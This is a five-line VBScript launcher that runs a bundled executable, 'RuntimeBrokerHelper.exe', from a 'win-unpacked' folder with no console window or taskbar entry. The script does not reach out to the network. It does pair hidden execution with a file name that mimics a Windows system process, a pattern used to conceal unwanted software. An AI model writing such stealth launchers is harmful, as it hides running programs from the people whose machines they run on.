' Silent launcher — no console, no taskbar entry
Dim shell, dir
Set shell = CreateObject("WScript.Shell")
dir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
shell.Run """" & dir & "win-unpacked\RuntimeBrokerHelper.exe""", 0, False
